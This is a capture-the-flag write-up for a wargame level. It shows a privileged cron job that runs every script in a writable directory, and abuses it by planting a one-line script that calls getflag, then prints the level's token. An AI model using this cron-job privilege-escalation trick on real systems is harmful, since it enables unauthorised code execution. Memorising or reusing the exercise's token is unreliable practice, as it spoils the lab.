## Level 05

We are gretted by a notification that we received a new mail!

We look through the /var/mail folder and find a `level05` containing:

`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

If we take a look at `/usr/sbin/openarenaserver`

We can find:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It executes every script in `/opt/openarenaserver` and deletes it, we can create one and `getflag`:

```bash
echo "getflag > /tmp/done" > /opt/openarenaserver/test.sh
```

We can find the flag here:

```bash
cat /tmp/done
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Token

viuaaale9huek52boumoomioc